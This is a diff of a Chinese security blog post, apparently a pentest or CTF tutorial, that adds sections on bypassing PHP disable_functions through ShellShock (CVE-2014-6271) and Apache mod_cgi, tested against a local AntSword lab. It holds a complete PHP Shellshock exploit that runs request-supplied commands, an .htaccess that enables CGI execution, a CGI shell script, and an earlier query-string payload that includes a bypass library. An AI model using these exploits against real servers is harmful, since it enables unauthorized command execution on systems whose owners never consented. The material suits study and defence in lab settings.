@@ -35,8 +35,26 @@
 <meta property="og:image" content="http://example.com/images/8EF3B810658047e5AB52E2B511DC6993.png">
 <meta property="og:image" content="http://example.com/images/AEEC7AAF6C014f01B805FCE1B83B4C5C.png">
 <meta property="og:image" content="http://example.com/images/1A47A6C3B0D045429D7A6641C757FBD1.png">
+<meta property="og:image" content="http://example.com/images/FDF9B6670B654754B1951E5564ADE2B2.png">
+<meta property="og:image" content="http://example.com/images/C534A1DDECFB485b9A77D1DDD33DB0C0.png">
+<meta property="og:image" content="http://example.com/images/B0219CF6F52545ccA138F9BE5134C36C.png">
+<meta property="og:image" content="http://example.com/images/41D486F6D2DF455d9A2F4329A38E7EDC.png">
+<meta property="og:image" content="http://example.com/images/870912528E2B4e4a94826FE20A3B12C8.png">
+<meta property="og:image" content="http://example.com/images/1176B94844A140f99F2CA89A84329F2D.png">
+<meta property="og:image" content="http://example.com/images/59D1FF7A7CFB4e27929E63A5CC59E596.png">
+<meta property="og:image" content="http://example.com/images/4901DE657E1542de8B0C42695780C0D1.png">
+<meta property="og:image" content="http://example.com/images/AE4DB324D23D4f1bADFEC99C06F98963.png">
+<meta property="og:image" content="http://example.com/images/2479447C6C4B4f93BE584A0E428D08FD.png">
+<meta property="og:image" content="http://example.com/images/E6D98FC3057646689D3D06C816C34675.png">
+<meta property="og:image" content="http://example.com/images/C350A8EC6C664cdf9F538AB05E25FD06.png">
+<meta property="og:image" content="http://example.com/images/3FDD07253048485d86235FBE3B3DA645.png">
+<meta property="og:image" content="http://example.com/images/F77B5B7FCB914183897AD2EBC2F43ABD.png">
+<meta property="og:image" content="http://example.com/images/9B654795B09B47839992D02FEA6B6C15.png">
+<meta property="og:image" content="http://example.com/images/EC77944104F14dc88DBA994B80975C17.png">
+<meta property="og:image" content="http://example.com/images/C152F3792A3B4901B171746869C644F7.png">
+<meta property="og:image" content="http://example.com/images/E1DB65F77FEA453eBD23E3105B80C44F.png">
 <meta property="article:published_time" content="2024-11-13T16:00:00.000Z">
-<meta property="article:modified_time" content="2024-11-18T08:16:58.331Z">
+<meta property="article:modified_time" content="2024-11-18T13:52:01.794Z">
 <meta property="article:author" content="奇怪的奇怪">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="http://example.com/images/42D753E40D834b9eB16A5A49E20DD25F.png">
@@ -249,7 +267,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          8k 字
+          12k 字
         
       </span>
     
@@ -260,7 +278,7 @@
         
         
         
-          67 分钟
+          102 分钟
         
       </span>
     
@@ -422,6 +440,58 @@
 <figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dts">?G<span class="hljs-attr">inkgo</span><span class="hljs-operator">=</span>aW5jbHVkZSgiL3Zhci90bXAvYnlwYXNzX2Rpc2FibGVmdW5jLnBocCIpOw==<span class="hljs-variable">&amp;cmd</span>=id<span class="hljs-variable">&amp;outpath</span>=<span class="hljs-keyword">/tmp/</span>outfile123<span class="hljs-variable">&amp;sopath</span>=<span class="hljs-keyword">/var/</span>tmp/bypass_disablefunc.so<br></code></pre></td></tr></table></figure>
 <p><img src="/images/8EF3B810658047e5AB52E2B511DC6993.png" srcset="/img/loading.gif" lazyload><br>如图所示，成功执行命令</p>
 <p>蚁剑有该绕过disable_functions的插件<br><img src="/images/AEEC7AAF6C014f01B805FCE1B83B4C5C.png" srcset="/img/loading.gif" lazyload><br><img src="/images/1A47A6C3B0D045429D7A6641C757FBD1.png" srcset="/img/loading.gif" lazyload><br>可以看见我们植入的恶意环境变量，但是在蚁剑中却看不到，因为语句结束后已经删除了</p>
+<h2 id="利用ShellShock-CVE-2014-6271"><a href="#利用ShellShock-CVE-2014-6271" class="headerlink" title="利用ShellShock(CVE-2014-6271)"></a>利用ShellShock(CVE-2014-6271)</h2><h3 id="使用条件："><a href="#使用条件：" class="headerlink" title="使用条件："></a>使用条件：</h3><ul>
+<li>Linux操作系统</li>
+<li>putenv()、mail()或error_log()函数可用</li>
+<li>目标系统的&#x2F;bin&#x2F;bash存在CVE-2014-6271漏洞</li>
+<li>&#x2F;bin&#x2F;sh -&gt;&#x2F;bin&#x2F;bash 默认的shell是bash</li>
+</ul>
+<h3 id="原理简述："><a href="#原理简述：" class="headerlink" title="原理简述："></a>原理简述：</h3><p>该方法利用的bash中的一个老漏洞，即Bash Shellshock 破壳漏洞(CVE-2014-6271)。<br>该漏洞的原因是Bash使用的环境变量是通过函数名称来调用的，导致该漏洞出现是以(){开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令，而其核心的原因在于在输入的过滤中没有严格限制边界，也没有做出合法化的参数判断。</p>
+<p>一般函数体内的代码不会被执行，但破壳漏洞会错误的将”{}”花括号外的命令进行执行。PHP里的某些函数(例如：mail()、imap_mail())能调用popen或其他能够派生bash子进程的函数，可以通过这些函数来触发破壳漏洞(CVE-2014-6271)执行命令。</p>
+<h3 id="利用方法-1"><a href="#利用方法-1" class="headerlink" title="利用方法"></a>利用方法</h3><p>我们利用AntSword-Labs项目来搭建环境：</p>
+<ul>
+<li>git clone <a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs.git">https://github.com/AntSwordProject/AntSword-Labs.git</a></li>
+<li>cd AntSword-Labs&#x2F;bypass_disable_functions&#x2F;2</li>
+<li>docker-compose up -d<br><img src="/images/FDF9B6670B654754B1951E5564ADE2B2.png" srcset="/img/loading.gif" lazyload><br>搭建完成后访问127.0.0.1:18080,尝试使用system函数执行命令失败<br><img src="/images/C534A1DDECFB485b9A77D1DDD33DB0C0.png" srcset="/img/loading.gif" lazyload><br>查看phpinfo发现设置了disable_functions：<br><img src="/images/B0219CF6F52545ccA138F9BE5134C36C.png" srcset="/img/loading.gif" lazyload><br>我们使用蚁剑拿下shell<br><img src="/images/41D486F6D2DF455d9A2F4329A38E7EDC.png" srcset="/img/loading.gif" lazyload><br>AntSword虚拟终端中已经集成了对ShellShock的利用，直接在虚拟终端执行命令即可绕过disable_functions<br>也可以选择手动利用。在有权限的目录中(&#x2F;var&#x2F;tmp&#x2F;exploit.php)上传以下利用脚本<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-comment"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions) </span><br><span class="hljs-comment"># Google Dork: none </span><br><span class="hljs-comment"># Date: 10/31/2014 </span><br><span class="hljs-comment"># Exploit Author: Ryan King (Starfall) </span><br><span class="hljs-comment"># Vendor Homepage: http://php.net </span><br><span class="hljs-comment"># Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror </span><br><span class="hljs-comment"># Version: 5.* (tested on 5.6.2) </span><br><span class="hljs-comment"># Tested on: Debian 7 and CentOS 5 and 6 </span><br><span class="hljs-comment"># CVE: CVE-2014-6271 </span><br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">shellshock</span>(<span class="hljs-params"><span class="hljs-variable">$cmd</span></span>) </span>&#123; <span class="hljs-comment">// Execute a command via CVE-2014-6271 @mail.c:283 </span><br>   <span class="hljs-variable">$tmp</span> = <span class="hljs-title function_ invoke__">tempnam</span>(<span class="hljs-string">&quot;.&quot;</span>,<span class="hljs-string">&quot;data&quot;</span>); <br>   <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;PHP_LOL=() &#123; x; &#125;; <span class="hljs-subst">$cmd</span> &gt;<span class="hljs-subst">$tmp</span> 2&gt;&amp;1&quot;</span>); <br>   <span class="hljs-comment">// In Safe Mode, the user may only alter environment variableswhose names </span><br>   <span class="hljs-comment">// begin with the prefixes supplied by this directive. </span><br>   <span class="hljs-comment">// By default, users will only be able to set environment variablesthat </span><br>   <span class="hljs-comment">// begin with PHP_ (e.g. PHP_FOO=BAR). Note: if this directive isempty, </span><br>   <span class="hljs-comment">// PHP will let the user modify ANY environment variable! </span><br>   <span class="hljs-comment">//mail(&quot;a@127.0.0.1&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;-bv&quot;); // -bv so we don&#x27;t actuallysend any mail </span><br>   <span class="hljs-title function_ invoke__">error_log</span>(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-number">1</span>);<br>   <span class="hljs-variable">$output</span> = @<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$tmp</span>); <br>   @<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$tmp</span>); <br>   <span class="hljs-keyword">if</span>(<span class="hljs-variable">$output</span> != <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">return</span> <span class="hljs-variable">$output</span>; <br>   <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No output, or not vuln.&quot;</span>; <br>&#125; <br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">shellshock</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;cmd&quot;</span>]); <br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<img src="/images/870912528E2B4e4a94826FE20A3B12C8.png" srcset="/img/loading.gif" lazyload><br>然后包含该脚本并传参执行命令即可<br><img src="/images/1176B94844A140f99F2CA89A84329F2D.png" srcset="/img/loading.gif" lazyload></li>
+</ul>
+<h3 id="检测是否有漏洞"><a href="#检测是否有漏洞" class="headerlink" title="检测是否有漏洞"></a>检测是否有漏洞</h3><p>运行命令检查版本</p>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">bash <span class="hljs-comment">--version</span><br></code></pre></td></tr></table></figure>
+<p>查看版本是否受漏洞影响（例如 Bash 4.3.27 Patch 27 及以上）。<br><img src="/images/59D1FF7A7CFB4e27929E63A5CC59E596.png" srcset="/img/loading.gif" lazyload><br>此版本易受shellshock漏洞影响</p>
+<p>可以通过以下命令检查系统是否易受Shellshock漏洞的影响<br>测试</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">env</span> x=<span class="hljs-string">&#x27;() &#123; :;&#125;; echo vulnerable&#x27;</span> bash -c <span class="hljs-string">&quot;echo test&quot;</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/4901DE657E1542de8B0C42695780C0D1.png" srcset="/img/loading.gif" lazyload></p>
+<ul>
+<li>如果输出vulnerable，则你的Bash 是易受攻击的。</li>
+<li>如果没有输出vulnerable(例如只显示test或报错)，则已修复。<br>上图所示，则bash存在漏洞</li>
+</ul>
+<h2 id="利用Apache-Mod-CGI"><a href="#利用Apache-Mod-CGI" class="headerlink" title="利用Apache Mod CGI"></a>利用Apache Mod CGI</h2><h3 id="使用条件：-1"><a href="#使用条件：-1" class="headerlink" title="使用条件："></a>使用条件：</h3><ul>
+<li>Linux操作系统</li>
+<li>Apache+PHP(apache使用apache_mod_php)</li>
+<li>Apache 开启了cgi、rewrite</li>
+<li>Web目录给了AllowOverride权限</li>
+<li>当前目录可写</li>
+</ul>
+<h3 id="原理简述-1"><a href="#原理简述-1" class="headerlink" title="原理简述"></a>原理简述</h3><p>早期的Web服务器，只能响应浏览器发来的HTTP静态资源的请求，并将存储在服务器中的静态资源返回给浏览器。随着Web技术的发展，逐渐出现了动态技术，但是Web服务器并不能够直接运行动态脚本，为了解决Web服务器与外部应用程序(CGI程序)之间数据互通，于是出现了CGI(Common Gateway Interface)通用网关接口。简单理解，可以认为CGI是Web服务器和运行在其上的应用程序进行”交流”的一种约定。</p>
+<p>当遇到动态脚本请求时，Web服务器主进程就会Fork创建出一个新的进程来启动CGI程序，运行外部C程序或Perl、PHP脚本等，也就是将动态脚本交给CGI程序来处理。启动CGI程序需要一个过程，如读取配置文件、加载扩展等。当CGI程序启动后会去解析动态脚本，然后将结果返回给Web服务器，最后由Web服务器将结果返回给客户端，之前Fork出来的进程也随之关闭。这样，每次用户请求动态脚本，Web服务器都要重新Fork创建一个新进程去启动CGI程序，由CGI程序来处理动态脚本，处理完成后进程随之关闭，其效率是非常低下的。</p>
+<p>而对于Mod CGI，Web服务器可以内置Perl解释器或PHP解释器。也就是说将这些解释器做成模块的方式，Web服务器会在启动的时候就启动这些解释器。当有新的动态请求进来时，Web服务器就是自己解析这些动态脚本，省的重新Fork一个进程，效率提高了。</p>
+<p>任何具有MIME类型application&#x2F;x-httpd-cgi或者被cgi-script处理器处理的文件都将被作为CGI脚本对待并由服务器运行，它的输出将被返回给客户端。可以通过两种途径使文件成为CGI脚本，一种是文件具有已由AddType指令定义的扩展名，另一种是文件位于ScriptAlias目录中。</p>
+<p>Apache在配置开启CGI后可以用ScriptAlias指令指定一个目录，指定的目录下面便可以存放可执行的CGI程序。若是想临时允许一个目录可以执行CGI程序并且使得服务器将自定义的后缀解析为CGI程序执行，则可以在目的目录下使用htaccess文件进行配置，如下</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">Options +ExecCGI<br><span class="hljs-keyword">AddHandler </span>cgi-<span class="hljs-keyword">script </span>.xxx<br></code></pre></td></tr></table></figure>
+<p>这样便会将当前目录下的所有.xxx文件当作CGI程序执行了。<br>由于CGI程序可以执行命令，那我们可以利用CGI来执行系统命令绕过disable_functions。</p>
+<h3 id="利用方法-2"><a href="#利用方法-2" class="headerlink" title="利用方法"></a>利用方法</h3><p>我们利用AntSword-Labs项目来搭建环境</p>
+<ul>
+<li>git clone <a target="_blank" rel="noopener" href="https://github.com/AntSwordProject/AntSword-Labs.git">https://github.com/AntSwordProject/AntSword-Labs.git</a></li>
+<li>cd AntSword-Labs&#x2F;bypass_disable_functions&#x2F;3</li>
+<li>docker-compose up -d</li>
+</ul>
+<p><img src="/images/AE4DB324D23D4f1bADFEC99C06F98963.png" srcset="/img/loading.gif" lazyload><br>搭建完成后访问127.0.0.1:18080<br><img src="/images/2479447C6C4B4f93BE584A0E428D08FD.png" srcset="/img/loading.gif" lazyload><br>用蚁剑拿到shell后无法执行命令<br><img src="/images/E6D98FC3057646689D3D06C816C34675.png" srcset="/img/loading.gif" lazyload><br>执行phpinfo发现设置了disable_functions<br><img src="/images/C350A8EC6C664cdf9F538AB05E25FD06.png" srcset="/img/loading.gif" lazyload><br>并且在Loaded Modules中发现了mod_cgi,这代表主机Apache开启了CGI模块，Web目录下有写入的权限。<br>我们首先在当前目录创建.htaccess文件，写入如下</p>
+<figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">Options</span> +ExecCGI<br>AddHandler cgi-script .<span class="hljs-keyword">ant</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/3FDD07253048485d86235FBE3B3DA645.png" srcset="/img/loading.gif" lazyload><br>然后新建shell.ant文件,写入要执行的命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-built_in">echo</span> Content-<span class="hljs-built_in">type</span>: text/html<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;&quot;</span><br><span class="hljs-built_in">echo</span>&amp;&amp;<span class="hljs-built_in">id</span><br></code></pre></td></tr></table></figure>
+<p><img src="/images/F77B5B7FCB914183897AD2EBC2F43ABD.png" srcset="/img/loading.gif" lazyload><br><img src="/images/9B654795B09B47839992D02FEA6B6C15.png" srcset="/img/loading.gif" lazyload><br>这里我们的shell.xxx还不能执行，因为还没有权限，我们使用php的chmod()函数给其添加可执行权限<br><img src="/images/EC77944104F14dc88DBA994B80975C17.png" srcset="/img/loading.gif" lazyload><br><img src="/images/C152F3792A3B4901B171746869C644F7.png" srcset="/img/loading.gif" lazyload><br>这里我们访问，按理说应该会直接出现执行命令的结果，但是出现了500错误<br>因为linux的CGI比较严格，上传后可能会发现状态码500，无法解析我们bash文件。因为我们的目标站点是linux环境，如果我们用(windows等)本地编译器编写上传时编码不一致导致无法解析，所以我们可以在linux环境中编写并导出再上传。</p>
+<p>在linux编译shell.ant后重复上述操作<br><img src="/images/E1DB65F77FEA453eBD23E3105B80C44F.png" srcset="/img/loading.gif" lazyload></p>
+<p>当然蚁剑也有绕过该disable_functions的插件<br><a target="_blank" rel="noopener" href="https://blog.wh1sper.com/posts/de1ctf2020_check-in/">De1CTF2020 check in</a>这道题利用的便是这个思路，常见于文件上传中</p>
 
                 
               </div>
@@ -483,6 +553,12 @@
                 <div class="post-prevnext my-3">
                   <article class="post-prev col-6">
                     
+                    
+                      <a href="/2024/11/24/CDN/" title="CDN内容分发网络">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CDN内容分发网络</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
                     
                   </article>
                   <article class="post-next col-6">
